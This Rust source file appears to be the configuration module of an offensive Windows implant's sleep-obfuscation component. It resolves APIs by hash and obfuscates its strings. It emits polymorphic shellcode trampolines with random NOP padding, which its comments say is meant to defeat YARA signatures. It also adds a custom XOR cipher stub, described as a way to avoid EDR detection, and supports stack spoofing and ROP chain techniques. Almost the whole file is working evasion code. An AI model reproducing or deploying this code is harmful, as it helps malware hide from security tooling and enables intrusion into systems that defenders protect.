use alloc::string::String;
use core::ptr::null_mut;

use obfstr::{obfstring as s};
use anyhow::{Result, bail};
use dinvk::hash::{jenkins3, murmur3};
use dinvk::winapis::{NtCurrentProcess, NT_SUCCESS};
use dinvk::module::{
    get_module_address, 
    get_proc_address, 
    get_ntdll_address
};

use crate::types::*;
use crate::{
    cfg::{is_cfg_enforced, register_cfg_targets},
    spoof::StackSpoof,
    winapis::*
};

/// Global configuration object.
static CONFIG: spin::Once<Config> = spin::Once::new();

/// Lazily initializes and returns a singleton [`Config`] instance.
#[inline]
pub fn init_config() -> Result<&'static Config> {
    CONFIG.try_call_once(Config::new)
}

/// Stores resolved DLL base addresses and function pointers.
#[derive(Default, Debug, Clone, Copy)]
pub struct Config {
    pub stack: StackSpoof,
    pub callback: u64,
    pub trampoline: u64,
    /// Trampoline that wraps WaitForMultipleObjects and stores the return value.
    /// This allows capturing the WFMO result in ROP chains where RAX would otherwise be lost.
    pub wfmo_trampoline: u64,
    pub modules: Modules,
    pub wait_for_single: WinApi,
    pub wait_for_multiple: WinApi,
    pub base_thread: WinApi,
    pub enum_date: WinApi,
    pub system_function040: WinApi,
    pub system_function041: WinApi,
    /// Custom SIMD XOR cipher stub address (replaces SystemFunction040/041)
    pub custom_encrypt: u64,
    pub custom_decrypt: u64,  // Same address as encrypt (XOR is self-inverse)
    pub nt_continue: WinApi,
    pub nt_set_event: WinApi,
    pub rtl_user_thread: WinApi,
    pub nt_protect_virtual_memory: WinApi,
    pub rtl_exit_user_thread: WinApi,
    pub nt_get_context_thread: WinApi,
    pub nt_set_context_thread: WinApi,
    pub nt_test_alert: WinApi,
    pub nt_wait_for_single: WinApi,
    pub rtl_acquire_lock: WinApi,
    pub tp_release_cleanup: WinApi,
    pub rtl_capture_context: WinApi,
    pub zw_wait_for_worker: WinApi,
}

/// Insert 0-3 random NOP-equivalent instructions to break byte signatures.
/// Uses RDTSC for randomness to avoid importing RNG APIs.
fn insert_random_nops(code: &mut alloc::vec::Vec<u8>, seed: u64) {
    let count = (seed & 0x3) as usize; // 0-3 nops
    let nop_table: [&[u8]; 5] = [
        &[0x90],                    // 1-byte nop
        &[0x66, 0x90],              // 2-byte nop
        &[0x0F, 0x1F, 0x00],       // 3-byte nop
        &[0x0F, 0x1F, 0x40, 0x00], // 4-byte nop
        &[0x48, 0x87, 0xC0],       // xchg rax, rax (nop-equivalent)
    ];
    for i in 0..count {
        let idx = ((seed >> (i * 3 + 4)) as usize) % nop_table.len();
        code.extend_from_slice(nop_table[idx]);
    }
}

impl Config {
    /// Create a new `Config`.
    pub fn new() -> Result<Self> {
        // Resolve hashed function addresses for all required APIs
        let mut cfg = Self::winapis(Self::modules());

        cfg.stack = StackSpoof::new(&cfg)?;
        cfg.callback = Self::alloc_callback()?;
        cfg.trampoline = Self::alloc_trampoline()?;
        cfg.wfmo_trampoline = Self::alloc_wfmo_trampoline()?;
        let cipher = Self::alloc_cipher_stub()?;
        cfg.custom_encrypt = cipher;
        cfg.custom_decrypt = cipher;

        // Register Control Flow Guard function targets if enabled
        if let Ok(true) = is_cfg_enforced() {
            register_cfg_targets(&cfg);
        }

        Ok(cfg)
    }

    /// Validates APIs required by the **timer** and **wait** ROP chain techniques.
    ///
    /// Called per-sleep-attempt so a failure is recoverable (the next cycle can retry)
    /// rather than poisoning the singleton `Config`.
    ///
    /// `uses_handles`: true when `WaitPrimitive::Handles` is in use (checks
    /// `WaitForMultipleObjects`); false for `Timeout` (checks `WaitForSingleObject`).
    pub fn validate_timer_wait_apis(&self, uses_handles: bool) -> Result<()> {
        // Core ROP chain targets (used by every timer/wait cycle)
        if self.nt_continue.is_null()
            || self.nt_protect_virtual_memory.is_null()
            || self.nt_get_context_thread.is_null()
            || self.nt_set_context_thread.is_null()
            || self.nt_set_event.is_null()
            || self.nt_wait_for_single.is_null()
            || self.rtl_capture_context.is_null()
            // Stack spoofing targets
            || self.base_thread.is_null()
            || self.enum_date.is_null()
            || self.rtl_user_thread.is_null()
            || self.rtl_acquire_lock.is_null()
            || self.zw_wait_for_worker.is_null()
        {
            bail!(s!("null API in timer/wait ROP chain"));
        }

        // Wait-primitive-specific target
        if uses_handles {
            if self.wait_for_multiple.is_null() {
                bail!(s!("null WaitForMultipleObjects"));
            }
        } else if self.wait_for_single.is_null() {
            bail!(s!("null WaitForSingleObject"));
        }

        Ok(())
    }

    /// Validates APIs required by the **foliage** (APC) ROP chain technique.
    ///
    /// Foliage uses `NtCreateThreadEx` + `NtQueueApcThread` instead of thread pool
    /// timers, so it needs `rtl_exit_user_thread`, `nt_test_alert`, and
    /// `tp_release_cleanup` but does NOT need `rtl_capture_context` or `nt_set_event`.
    pub fn validate_foliage_apis(&self, uses_handles: bool) -> Result<()> {
        // Core ROP chain targets (foliage-specific)
        if self.nt_continue.is_null()
            || self.nt_protect_virtual_memory.is_null()
            || self.nt_get_context_thread.is_null()
            || self.nt_set_context_thread.is_null()
            || self.nt_wait_for_single.is_null()
            || self.rtl_exit_user_thread.is_null()
            || self.nt_test_alert.is_null()
            || self.tp_release_cleanup.is_null()
            // Stack spoofing targets
            || self.base_thread.is_null()
            || self.enum_date.is_null()
            || self.rtl_user_thread.is_null()
            || self.rtl_acquire_lock.is_null()
            || self.zw_wait_for_worker.is_null()
        {
            bail!(s!("null API in foliage ROP chain"));
        }

        // Wait-primitive-specific target
        if uses_handles {
            if self.wait_for_multiple.is_null() {
                bail!(s!("null WaitForMultipleObjects"));
            }
        } else if self.wait_for_single.is_null() {
            bail!(s!("null WaitForSingleObject"));
        }

        Ok(())
    }

    /// Allocates a small executable memory region used as a trampoline in thread pool callbacks.
    /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
    pub fn alloc_callback() -> Result<u64> {
        // Generate polymorphic trampoline shellcode
        let seed = unsafe { core::arch::x86_64::_rdtsc() };
        let mut callback = alloc::vec::Vec::with_capacity(32);

        insert_random_nops(&mut callback, seed);
        callback.extend_from_slice(&[0x48, 0x89, 0xD1]);       // mov rcx, rdx
        insert_random_nops(&mut callback, seed >> 8);
        callback.extend_from_slice(&[0x48, 0x8B, 0x41, 0x78]); // mov rax, [rcx+0x78] (CONTEXT.RAX)
        insert_random_nops(&mut callback, seed >> 16);
        callback.extend_from_slice(&[0xFF, 0xE0]);              // jmp rax

        // Allocate RW memory for trampoline
        let mut size = callback.len();
        let mut addr = null_mut();
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            0, 
            &mut size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )) {
            bail!(s!("failed to allocate stack memory"));
        }

        // Write trampoline bytes to allocated memory
        unsafe { core::ptr::copy_nonoverlapping(callback.as_ptr(), addr as *mut u8, callback.len()) };

        // Change protection to RX for execution
        let mut old_protect = 0;
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            &mut size, 
            PAGE_EXECUTE_READ as u32, 
            &mut old_protect
        )) {
            bail!(s!("failed to change memory protection for RX"));
        }

        // Locks the specified region of virtual memory into physical memory,
        // preventing it from being paged to disk by the memory manager
        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Allocates trampoline memory for the execution of `RtlCaptureContext`.
    /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
    pub fn alloc_trampoline() -> Result<u64> {
        // Generate polymorphic trampoline shellcode
        let seed = unsafe { core::arch::x86_64::_rdtsc() };
        let mut trampoline = alloc::vec::Vec::with_capacity(32);

        insert_random_nops(&mut trampoline, seed);
        trampoline.extend_from_slice(&[0x48, 0x89, 0xD1]); // mov rcx, rdx
        insert_random_nops(&mut trampoline, seed >> 8);
        trampoline.extend_from_slice(&[0x48, 0x31, 0xD2]); // xor rdx, rdx
        insert_random_nops(&mut trampoline, seed >> 16);
        trampoline.extend_from_slice(&[0xFF, 0x21]);        // jmp [rcx]

        // Allocate RW memory for trampoline
        let mut size = trampoline.len();
        let mut addr = null_mut();
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            0, 
            &mut size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )) {
            bail!(s!("failed to allocate stack memory"));
        }

        // Write trampoline bytes to allocated memory
        unsafe { core::ptr::copy_nonoverlapping(trampoline.as_ptr(), addr as *mut u8, trampoline.len()) };

        // Change protection to RX for execution
        let mut old_protect = 0;
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            &mut size, 
            PAGE_EXECUTE_READ as u32, 
            &mut old_protect
        )) {
            bail!(s!("failed to change memory protection for RX"));
        }

        // Locks the specified region of virtual memory into physical memory,
        // preventing it from being paged to disk by the memory manager
        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Allocates a trampoline that wraps WaitForMultipleObjects and stores the result.
    ///
    /// This trampoline solves the WFMO return value race condition in ROP chains.
    /// When called via NtContinue, the WFMO return value in RAX would normally be
    /// overwritten by the next NtContinue call before it can be read.
    ///
    /// The trampoline takes 6 parameters:
    /// - RCX: nCount
    /// - RDX: lpHandles  
    /// - R8:  bWaitAll
    /// - R9:  dwMilliseconds
    /// - [RSP+0x28]: result_ptr - pointer to u64 where result will be stored
    /// - [RSP+0x30]: wfmo_addr - address of WaitForMultipleObjects
    ///
    /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
    /// NOPs are inserted between instruction groups that don't affect the stack pointer,
    /// so the stack offsets (0x60, 0x68) remain correct.
    pub fn alloc_wfmo_trampoline() -> Result<u64> {
        // Generate polymorphic WFMO trampoline shellcode
        let seed = unsafe { core::arch::x86_64::_rdtsc() };
        let mut code = alloc::vec::Vec::with_capacity(64);

        // Prologue: save callee-saved registers and allocate shadow space
        insert_random_nops(&mut code, seed);
        code.extend_from_slice(&[0x53]);                         // push rbx
        code.extend_from_slice(&[0x41, 0x54]);                   // push r12
        code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);       // sub rsp, 0x28

        // Load parameters from stack
        insert_random_nops(&mut code, seed >> 8);
        code.extend_from_slice(&[0x48, 0x8B, 0x5C, 0x24, 0x60]); // mov rbx, [rsp+0x60] ; result_ptr
        code.extend_from_slice(&[0x4C, 0x8B, 0x64, 0x24, 0x68]); // mov r12, [rsp+0x68] ; wfmo_addr

        // Call WaitForMultipleObjects
        insert_random_nops(&mut code, seed >> 16);
        code.extend_from_slice(&[0x41, 0xFF, 0xD4]);             // call r12

        // Store result and epilogue
        insert_random_nops(&mut code, seed >> 24);
        code.extend_from_slice(&[0x48, 0x89, 0x03]);             // mov [rbx], rax
        code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);       // add rsp, 0x28
        code.extend_from_slice(&[0x41, 0x5C]);                   // pop r12
        code.extend_from_slice(&[0x5B]);                         // pop rbx
        code.extend_from_slice(&[0xC3]);                         // ret

        // Allocate RW memory for trampoline
        let mut size = code.len();
        let mut addr = null_mut();
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(),
            &mut addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        )) {
            bail!(s!("failed to allocate WFMO trampoline memory"));
        }

        // Write trampoline bytes to allocated memory
        unsafe { core::ptr::copy_nonoverlapping(code.as_ptr(), addr as *mut u8, code.len()) };

        // Change protection to RX for execution
        let mut old_protect = 0;
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(),
            &mut addr,
            &mut size,
            PAGE_EXECUTE_READ as u32,
            &mut old_protect
        )) {
            bail!(s!("failed to change WFMO trampoline memory protection to RX"));
        }

        // Lock the memory to prevent paging
        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Allocates a custom SIMD XOR cipher stub for ROP chain memory encryption.
    /// Replaces SystemFunction040/041 to avoid EDR detection.
    /// Uses SSE2 PXOR which is self-inverse (encrypt = decrypt).
    ///
    /// Calling convention (matches SystemFunction040):
    ///   RCX = memory pointer
    ///   RDX = size in bytes  
    ///   R8  = unused
    pub fn alloc_cipher_stub() -> Result<u64> {
        // Generate random 16-byte XOR key using RDTSC
        let mut key = [0u8; 16];
        for i in 0..16 {
            let tsc = unsafe { core::arch::x86_64::_rdtsc() };
            key[i] = ((tsc >> ((i & 7) * 8)) ^ (tsc >> 32)) as u8;
            for _ in 0..((tsc & 0xF) + 1) { core::hint::spin_loop(); }
        }

        // Shellcode: SIMD XOR cipher
        // 50 bytes of code + 16 bytes of embedded key = 66 bytes total
        let shellcode_code: [u8; 50] = [
            0x53,                                     // push rbx
            0x56,                                     // push rsi
            0x48, 0x89, 0xCE,                         // mov rsi, rcx        ; data ptr
            0x89, 0xD1,                               // mov ecx, edx        ; size
            0xC1, 0xE9, 0x04,                         // shr ecx, 4          ; blocks = size/16
            0x85, 0xC9,                               // test ecx, ecx
            0x74, 0x1F,                               // jz .done (+31)
            0x48, 0x8D, 0x05, 0x1D, 0x00, 0x00, 0x00,// lea rax, [rip+29]   ; -> key
            0xF3, 0x0F, 0x6F, 0x00,                   // movdqu xmm0, [rax]  ; load key
            // .loop:
            0xF3, 0x0F, 0x6F, 0x0E,                   // movdqu xmm1, [rsi]  ; load block
            0x66, 0x0F, 0xEF, 0xC8,                   // pxor xmm1, xmm0    ; XOR
            0xF3, 0x0F, 0x7F, 0x0E,                   // movdqu [rsi], xmm1  ; store
            0x48, 0x83, 0xC6, 0x10,                   // add rsi, 16
            0xFF, 0xC9,                               // dec ecx
            0x75, 0xEC,                               // jnz .loop (-20)
            // .done:
            0x31, 0xC0,                               // xor eax, eax
            0x5E,                                     // pop rsi
            0x5B,                                     // pop rbx
            0xC3,                                     // ret
        ];

        let total = shellcode_code.len() + key.len();
        let mut shellcode = alloc::vec::Vec::with_capacity(total);
        shellcode.extend_from_slice(&shellcode_code);
        shellcode.extend_from_slice(&key);

        let mut size = shellcode.len();
        let mut addr = null_mut();
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(), &mut addr, 0, &mut size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        )) {
            bail!(s!("failed to allocate cipher stub memory"));
        }

        unsafe { core::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len()) };

        let mut old_protect = 0;
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(), &mut addr, &mut size,
            PAGE_EXECUTE_READ as u32, &mut old_protect
        )) {
            bail!(s!("failed to set cipher stub to RX"));
        }

        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Resolves the base addresses of key Windows modules (`ntdll.dll`, `kernel32.dll`, etc).
    fn modules() -> Modules {
        // Load essential DLLs
        let ntdll = get_ntdll_address();
        let kernel32 = get_module_address(2808682670u32, Some(murmur3));
        let kernelbase = get_module_address(2737729883u32, Some(murmur3));
        let load_library = get_proc_address(kernel32, 4066094997u32, Some(murmur3));
        let cryptbase = {
            let mut addr = get_module_address(3312853920u32, Some(murmur3));
            if addr.is_null() {
                addr = uwd::spoof!(load_library, obfstr::obfcstr!(c"CryptBase").as_ptr())
                    .expect(obfstr::obfstr!("Error"))
            }

            addr
        };

        Modules {
            ntdll: Dll::from(ntdll),
            kernel32: Dll::from(kernel32),
            cryptbase: Dll::from(cryptbase),
            kernelbase: Dll::from(kernelbase),
        }
    }

    /// Resolves hashed API winapis addresses.
    fn winapis(modules: Modules) -> Self {
        let ntdll = modules.ntdll.as_ptr();
        let kernel32 = modules.kernel32.as_ptr();
        let cryptbase = modules.cryptbase.as_ptr();

        Self {
            modules,
            wait_for_single: get_proc_address(kernel32, 4186526855u32, Some(jenkins3)).into(),
            // WaitForMultipleObjects: jenkins3 hash = 3963274078
            wait_for_multiple: get_proc_address(kernel32, 3963274078u32, Some(jenkins3)).into(),
            base_thread: get_proc_address(kernel32, 4083630997u32, Some(murmur3)).into(),
            enum_date: get_proc_address(kernel32, 695401002u32, Some(jenkins3)).into(),
            system_function040: get_proc_address(cryptbase, 1777190324, Some(murmur3)).into(),
            system_function041: get_proc_address(cryptbase, 587184221, Some(murmur3)).into(),
            nt_continue: get_proc_address(ntdll, 3396789853u32, Some(jenkins3)).into(),
            rtl_capture_context: get_proc_address(ntdll, 1384243883u32, Some(jenkins3)).into(),
            nt_set_event: get_proc_address(ntdll, 1943906260, Some(jenkins3)).into(),
            rtl_user_thread: get_proc_address(ntdll, 1578834099, Some(murmur3)).into(),
            nt_protect_virtual_memory: get_proc_address(ntdll, 581945446, Some(jenkins3)).into(),
            rtl_exit_user_thread: get_proc_address(ntdll, 1518183789, Some(jenkins3)).into(),
            nt_set_context_thread: get_proc_address(ntdll, 3400324539u32, Some(jenkins3)).into(),
            nt_get_context_thread: get_proc_address(ntdll, 437715432, Some(jenkins3)).into(),
            nt_test_alert: get_proc_address(ntdll, 2960797277u32, Some(murmur3)).into(),
            nt_wait_for_single: get_proc_address(ntdll, 2606513692u32, Some(jenkins3)).into(),
            rtl_acquire_lock: get_proc_address(ntdll, 160950224u32, Some(jenkins3)).into(),
            tp_release_cleanup: get_proc_address(ntdll, 2871468632u32, Some(jenkins3)).into(),
            zw_wait_for_worker: get_proc_address(ntdll, 2326337356u32, Some(jenkins3)).into(),
            ..Default::default()
        }
    }
}

/// Get current stack pointer
#[inline]
pub fn current_rsp() -> u64 {
    let rsp: u64;
    unsafe { core::arch::asm!("mov {}, rsp", out(reg) rsp) };
    rsp
}
